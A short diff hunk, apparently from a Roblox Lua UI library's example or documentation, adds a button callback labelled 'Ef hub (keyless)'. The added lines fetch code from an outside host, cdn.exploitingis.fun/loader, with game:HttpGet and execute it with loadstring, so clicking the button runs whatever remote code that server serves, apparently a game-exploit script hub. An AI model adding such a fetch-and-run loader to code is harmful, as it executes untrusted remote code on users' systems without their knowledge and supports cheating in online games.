@@ -375,6 +375,9 @@ Name = <string> - The name of the section.
 Tab:AddButton({
 	Name = "Ef hub 🟠 (keyless)",
 	Callback = function()
+ loadstring(game:HttpGet(
+"https://cdn.exploitingis.fun/loader"
+))()
       		print("button pressed")
   	end    
 })
